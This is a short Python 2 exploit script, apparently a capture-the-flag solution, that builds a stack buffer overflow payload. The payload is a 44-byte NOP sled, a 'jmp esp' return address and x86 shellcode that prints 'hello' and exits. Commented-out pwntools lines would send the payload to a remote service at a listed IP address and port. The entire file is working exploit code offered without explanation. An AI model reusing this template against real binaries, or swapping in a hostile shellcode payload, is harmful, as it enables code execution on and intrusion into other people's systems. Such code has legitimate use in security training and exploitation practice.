# from pwn import *
import struct

REMOTE = False

# r = remote("104.154.106.182", 3456)

# Length of the vuln buffer
BUFFER_LEN = 44

# Shellcode to execute here. 
SHELLCODE = b""
SHELLCODE += b"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3"
SHELLCODE += b"\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd"
SHELLCODE += b"\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"

# Will take us to just after the ret pointer
# 0x08048544 : jmp esp
ret_add = struct.pack("<I", 0x08048544)

payload = b""
payload += b"\x90" * BUFFER_LEN
payload += ret_add
payload += SHELLCODE


# r.recvuntil("$")
# r.send(payload)
# r.send("\n")
# r.interactive()

print payload